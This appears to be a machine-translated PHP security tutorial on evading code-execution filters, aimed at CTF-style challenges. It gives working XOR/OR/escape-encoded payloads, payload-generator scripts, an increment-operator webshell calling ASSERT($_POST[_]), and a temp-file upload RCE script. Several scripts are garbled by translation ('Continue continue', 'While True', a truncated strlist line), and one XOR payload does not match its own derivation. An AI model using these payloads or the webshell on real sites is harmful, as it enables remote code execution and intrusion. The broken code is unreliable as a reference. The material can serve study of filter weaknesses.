# PHP safe learning—bypass code execution filtering

Author: H3rmesk1t

Data: 2021.06.02

# Code execution function

Functions with code execution function in PHP

- `eval()`: The most common code execution function, executing string code as PHP code

```php
eval ( string $code ) : mixed
```
- `assert()`: Check if an assertion is false
assert() will check the specified assertion and take appropriate action when the result is false. In PHP5 or PHP7, if the assertion is a string, it will be executed by assert() as PHP code.
```php
PHP 5
assert ( mixed $assertion [, string $description ] ) : bool

PHP 7
assert ( mixed $assertion [, Throwable $exception ] ) : bool
```
- `preg_replace()+/e`: Perform search and replacement of a regular expression
Search for the part of the subject that matches the pattern and replace it with replacement. If the pattern's pattern modifier uses /e, then when the subject is matched successfully, the replacement will be executed as PHP code (the /e modifier of the preg_replace()+ function is removed in PHP7)
```php
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed
```
- `create_function()`: Create an anonymous (lambda style) function
Create an anonymous function based on the passed parameters and return a unique name to it. If the parameter pass is not strictly filtered, the attacker can construct a payload to pass it to create_function() to inject malicious code into the parameter or function body closure to cause the code to be executed

```php
create_function ( string $args , string $code ) : string
```
- `array_map()`: Apply a callback function for each element of the array
Return an array, which is an array after applying a callback function to each element of array. array_map() returns an array. The elements with array content of array1 are the result of calling callback in the index order (when there are more arrays, the elements of arrays will be passed in). The number of formal parameters of the callback function must match the number of arrays in the actual parameter array_map()

```php
array_map ( callable $callback , array $array , array ...$arrays ) : array
```

- `call_user_func()`: Call the first parameter as a callback function
The first parameter callback is the called callback function, and the rest are the parameters of the callback function

```php
call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed
```
- `call_user_func_array()`: Call the callback function and use an array parameter as the callback function parameter
Call the first parameter as callback function callback, and pass the parameter array as param_arr as the parameter parameter of the callback function, similar to array_map()

```php
call_user_func_array ( callable $callback , array $param_arr ) : mixed
```

- `array_filter()`: Use callback function to filter units in array
Pass each value in the array array to the callback function in turn. If the callback function returns true, the current value of the array array will be included in the returned result array, and the key name of the array remains unchanged.

```php
array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array
```
- `usort()`: Sort values ​​in an array using user-defined comparison function
This function will sort the values ​​in an array using a user-defined comparison function. If the array to be sorted needs to be sorted by an unusual standard, then this function should be used

```php
usort ( array &$array , callable $value_compare_func ) : bool
```
# String stitching bypass
> String stitching bypassing the limitations that are applicable to bypass filtering specific keywords
Applicable to PHP version: PHP>=7

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_POST['cmd'];
if (isset($cmd)) {
    if (preg_match('/phpinfo|system/i', $cmd)) {
        die('Hacker!!!Fuck_you!!!');
    }else {
        eval($cmd);
    }
}else {
    echo "Welcome!!!";
}
?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602153035107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```
Payload:

(p.h.p.i.n.f.o)();
(sy.(st).em)(whoami);
(sy.(st).em)(who.ami);
(s.y.s.t.e.m)("whoami");
.........
```
# string escape bypass
Applicable to PHP version: PHP>=7

- `\[0–7]{1,3}` escape characters expressed in octal will be automatically adapted to byte (such as "\400" == "\000")
- Escape character notation in hexadecimal `\x[0–9A-Fa-f]{1,2}` (such as "\x41")
- The `\u{[0–9A-Fa-f]+}` character represented in Unicode will be output as a UTF-8 string
>`Note that the characters after escape here must be wrapped in double quotes. Passing parameters.`

```python
Processing scripts:

# -*- coding:utf-8 -*-
def hex_payload(payload):
	res_payload = ''
	for i in payload:
		i = "\\x" + hex(ord(i))[2:]
		res_payload += i
	print("[+]'{}' Convert to hex: \"{}\"".format(payload,res_payload))

def oct_payload(payload):
	res_payload = ""
	for i in payload:
		i = "\\" + oct(ord(i))[2:]
		res_payload += i
	print("[+]'{}' Convert to oct: \"{}\"".format(payload,res_payload))

def uni_payload(payload):
	res_payload = ""
	for i in payload:
		i = "\\u{{{0}}}".format(hex(ord(i))[2:])
		res_payload += i
	print("[+]'{}' Convert to unicode: \"{}\"".format(payload,res_payload))

if __name__ == '__main__':
	payload = 'phpinfo'
	hex_payload(payload)
	oct_payload(payload)
	uni_payload(payload)
```
![Insert the picture description here](https://img-blog.csdnimg.cn/2021060215431999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602154511761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/2021
0602154520380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

At the same time, the octal method can bypass the alphabetical parameters for code execution

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602154721364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Pass multiple times bypass
Applicable to PHP version: Unlimited
If quotes are filtered (single/double quotes), you can bypass them by following the following methods

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602155232664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602155238832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

If the PHP version is greater than 7, you can also use splicing method to bypass filtering quotes

![Insert the picture description here](https://img-blog.csdnimg.cn/2021060215535943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

If the parameter length is limited, you can also bypass the parameter length limit or callback function by passing multiple parameters.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602155639891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Most of the callback functions may depend on the specific length of the limit, but when PHP >= 5.6 & PHP < 7, the above filtering method can be bypassed.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602160118697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Built-in function access bypass
Applicable to PHP version: Windows local test is PHP>=7, but it is not sure that it cannot be used even if the PHP5 test reports an error.
`get_defined_functions()`: Returns an array of all defined functions
Using this method, you need to know the specific version of PHP, because the values ​​returned by get_defined_functions() in each version are different, here php7.3.4 is the basis.

![Insert the picture description here](https://img-blog.csdnimg.cn/2021060216080145.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602160807899.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602161219883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602161225556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# XOR bypass
Applicable to PHP version: Unlimited
For example: we get A after XOR ? and ~

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602161622238.png#pic_center)

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(preg_match('/[a-z0-9]/is', $_GET['shell'])){
	echo "hacker!!";
}else{
	eval($_GET['shell']);
}
?>
```

```python
XOR script

# -*- coding: utf-8 -*-
payload = "assert"
33, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]
#strlist is the decimal character of all non-alphanumeric characters in the ascii table
str1,str2 = '',''

for char in payload:
    for i in strlist:
        for j in strlist:
            if(i ^ j == ord(char)):
                i = '%{:0>2}'.format(hex(i)[2:])
                j = '%{:0>2}'.format(hex(j)[2:])
                print("('{0}'^'{1}')".format(i,j),end=".")
                break
        else:
            Continue continue
        break
```

One code execution can only get the string of the statement we want to execute, but cannot execute the statement, so the code needs to be executed twice for construction.
Use a script to convert each letter and then splice it

```php
$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');
//$_='assert';
$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');
//$__='_GET';
$___=$$__;
//$___='$_GET';
$_($___[_]);
//assert($_GET[_]);
```

Payload: `$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');$__='_'.('%07'^'%40').('%05'^'%5d');$__=$$__;$_($___[_]);&_=phpinfo();`

>After local testing, it was found that this method can be used in php5 and php7.0.9 versions, because the problem of assert() is not X- or cannot be used
Secondly, some of the lower versions of PHP5 may be due to magic_quotes
_gpc enabled relationship makes it impossible to use

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602162530266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

When the range of filtering characters is not that large, or just filtering keywords, you can use the following script

```python
# -*- coding: utf-8 -*-
import string

char = string.printable
cmd = 'phpinfo'
tmp1,tmp2 = '',''
for res in cmd:
    for i in char:
        for j in char:
            if(ord(i)^ord(j) == ord(res)):
                tmp1 += i
                tmp2 += j
                break
        else:
            Continue continue
        break
print("('{}'^'{}')".format(tmp1,tmp2))
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602163013317.png#pic_center)

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602162947813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Find a master's method
```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
//${_GET}{%ff}();&%ff=phpinfo
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602164701956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

fuzz script

```python
def r_xor():
	for i in range(0,127):
		for j in range(0,127):
			result=i^j
			print(" "+chr(i)+" ASCII:"+str(i)+' <--xor--'+chr(j)+" ASCII:"+str(j)+' == '+chr(result)+" ASCII:"+str(result))

if __name__ == "__main__":
	r_xor()
```
Analysis:
- See the underscores "_", "__", "___" in the code are a variable, because preg_match() filters all letters, we can only use underscores as variable names
- The use of assert($_POST[ _ ]) In PHP5, the function of assert() is similar to that of eval(), but eval is used because it is a language constructor rather than a function and cannot be called by a mutable function. Therefore, this splicing method can only use assert instead of eval. However, eval() only executes code that meets the php encoding specifications. At the same time, variables are used to payload splice, and splice it.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602164314723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602164556266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# or bypass
Generate scripts

```php
<?php
$myfile = fopen("or_rce.txt", "w");
$contents="phpinfo";
for ($i=0; $i < 256; $i++) {
    for ($j=0; $j <256; $j++) {

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[0-9a-z]/i';//Change it according to the regular expression given by the question
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }
  
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

Construct scripts using generated data
```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("or_rce.txt","r")
       While True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
While True:
   param=action(input("\n[+] your function:") )+action(input("[+] your command:"))+";"
   print(param)
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602170233796.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602170239753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# URL encoding reverse bypass
Applicable to PHP version: Unlimited

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602163350934.png#pic_center)
![Insert here
Into the picture description](https://img-blog.csdnimg.cn/20210602163356845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602163534793.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602163540529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Increment and decreasing operator bypass

The first letter of the array (Array) is capital A, and the fourth letter is lowercase a, that is, we can get both lowercase and capital A, which means we can get all the letters of a-z and A-Z.
In PHP, if an array and string is forced to be concatenated, the array will be converted into a string with a value of Array

![Insert the picture description here](https://img-blog.csdnimg.cn/20210602170700528.png#pic_center)

Take the first letter of this string and you can get `A`
Using this technique, I wrote the following webshell (because the PHP function is case-insensitive, we ended up executing ASSERT($POST[_]) without getting lowercase a)

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
$____='_';
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
Payload
Note that when you pass in the last time, remember to encode the URL once, the password is _, and POST is passed in _=phpinfo();
The version used here is PHP 7.0.12 and below

```php
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$ __++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$ __++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210602173445963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Upload temporary files

Upload temporary file [Specific principle] (https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

```python
#coding:utf-8
#author yu22x
import requests
url="http://xxx/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat f*'}
response=requests.post(url,files=files)
html = response.text
print(html)
```